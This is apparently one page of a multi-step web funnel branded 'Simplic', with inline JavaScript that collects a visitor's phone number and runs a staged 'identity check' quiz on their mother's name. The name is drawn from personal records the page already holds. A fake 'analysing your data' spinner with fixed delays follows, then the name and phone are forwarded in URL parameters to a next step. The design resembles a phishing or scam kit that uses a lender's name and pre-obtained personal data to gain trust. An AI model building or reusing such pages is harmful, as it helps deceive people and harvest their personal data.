<!DOCTYPE html><html lang="pt-BR"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simplic - Confirmação de Dados</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <!-- ... resto do HTML igual ... -->

    <script src="js/bootstrap.bundle.min.js"></script>
    <script src="js/all.min.js"></script>
    <script src="js/pixel.js"></script>
    <script>
        const userDataString = localStorage.getItem('dadosUsuario');
        let userData;
        
        try {
            if (!userDataString) {
                window.location.href = '../2/index.html';
            }
            userData = JSON.parse(userDataString);
            console.log('Dados do usuário recuperados:', userData);
        } catch (error) {
            console.error('Erro ao decodificar dados do usuário:', error);
            window.location.href = '../2/index.html';
        }
        
        let birthdateWrongAttempts = 0;
        let motherWrongAttempts = 0;
        
        function showNotification(elementId, messageId, message) {
            const notification = document.getElementById(elementId);
            const notificationMessage = document.getElementById(messageId);
            
            notificationMessage.textContent = message;
            notification.style.display = 'flex';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 5000);
        }
        
        document.getElementById('phone').addEventListener('input', function (e) {
            let value = e.target.value;
            value = value.replace(/\D/g, '');
            if (value.length > 0) {
                value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
                value = value.replace(/(\d)(\d{4})$/, '$1-$2');
            }
            if (value.length > 15) {
                value = value.substring(0, 15);
            }
            e.target.value = value;
            e.target.selectionStart = e.target.value.length;
            e.target.selectionEnd = e.target.value.length;
        });
        
        document.getElementById('phone-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value.replace(/\D/g, '');
            
            if (phone.length < 10) {
                showNotification('notification', 'notification-message', 'Por favor, insira um número de telefone válido');
                return;
            }
            
            const telefoneFormatado = document.getElementById('phone').value;
            localStorage.setItem('tel', telefoneFormatado);
            localStorage.setItem('telDigits', phone); // <-- salva só números
            
            document.getElementById('phone-step').style.display = 'none';
            prepareAndShowBirthdateOptions();
        });
        
        // ... funções de nascimento iguais ...

        function prepareAndShowMotherOptions() {
            const motherOptions = document.getElementById('mother-options');
            motherOptions.innerHTML = '';
            
            let correctMother = 'Nenhuma das alternativas';
            if (userData.MAE && userData.MAE.trim() !== '') {
                correctMother = userData.MAE.toUpperCase();
            }
            
            const options = generateRandomNames(correctMother);
            shuffleArray(options);
            
            options.forEach((name) => {
                const optionCard = document.createElement('div');
                optionCard.className = 'option-card';
                optionCard.dataset.value = name;
                optionCard.innerHTML = name;
                
                optionCard.addEventListener('click', function() {
                    document.querySelectorAll('#mother-options .option-card').forEach(card => {
                        card.classList.remove('selected');
                    });
                    this.classList.add('selected');
                    
                    const selectedValue = this.dataset.value;
                    let correctMother = 'Nenhuma das alternativas';
                    if (userData.MAE && userData.MAE.trim() !== '') {
                        correctMother = userData.MAE.toUpperCase();
                    }
                    
                    if (selectedValue === correctMother) {
                        setTimeout(() => {
                            const params = getUrlParams();
                            if (userData.nome) {
                                params.name = userData.nome;
                            }
                            
                            const telefoneFormatado = localStorage.getItem('tel');
                            const telefoneNumeros = localStorage.getItem('telDigits');
                            if (telefoneFormatado) {
                                params.phone = telefoneFormatado; // com máscara
                            }
                            if (telefoneNumeros) {
                                params.telephone = telefoneNumeros; // só números
                            }
                            
                            // mensagem de sucesso
                            const successMessage = document.createElement('div');
                            successMessage.className = 'confirmation-success';
                            successMessage.innerHTML = `
                                <div class="success-icon">
                                    <i class="fas fa-check-circle fa-4x text-success"></i>
                                </div>
                                <h3 id="loading-message" class="mt-4 mb-4" style="color: #28a745;">Analisando seus dados...</h3>
                                <div class="spinner-border text-success mb-4" role="status"></div>
                                <p>Redirecionando para a próxima etapa...</p>
                            `;
                            successMessage.style.position = 'fixed';
                            successMessage.style.top = '0';
                            successMessage.style.left = '0';
                            successMessage.style.width = '100%';
                            successMessage.style.height = '100%';
                            successMessage.style.backgroundColor = 'rgba(255, 255, 255, 0.9)';
                            successMessage.style.display = 'flex';
                            successMessage.style.flexDirection = 'column';
                            successMessage.style.alignItems = 'center';
                            successMessage.style.justifyContent = 'center';
                            successMessage.style.zIndex = '9999';
                            successMessage.style.animation = 'fadeIn 0.5s ease-in-out';
                            document.body.appendChild(successMessage);
                            
                            const style = document.createElement('style');
                            style.innerHTML = `
                                @keyframes fadeIn {
                                    from { opacity: 0; }
                                    to { opacity: 1; }
                                }
                            `;
                            document.head.appendChild(style);
                            
                            setTimeout(() => {
                                document.getElementById('loading-message').textContent = 'Dados verificados com sucesso!';
                            }, 1500);
                            
                            setTimeout(() => {
                                const url = new URL('../4/index.html', window.location.href);
                                Object.keys(params).forEach(key => {
                                    url.searchParams.append(key, params[key]);
                                });
                                window.location.href = url.toString();
                            }, 3000);
                        }, 300);
                    } else {
                        showNotification('mother-notification', 'mother-notification-message', 'Nome da mãe incorreto! Por favor, tente novamente.');
                        document.getElementById('mother-options').classList.add('error-shake');
                        setTimeout(() => {
                            document.getElementById('mother-options').classList.remove('error-shake');
                        }, 500);
                        setTimeout(() => {
                            this.classList.remove('selected');
                        }, 600);
                    }
                });
                motherOptions.appendChild(optionCard);
            });
            document.getElementById('mother-step').style.display = 'block';
        }

        // ... resto igual ...
    </script>
</body></html>
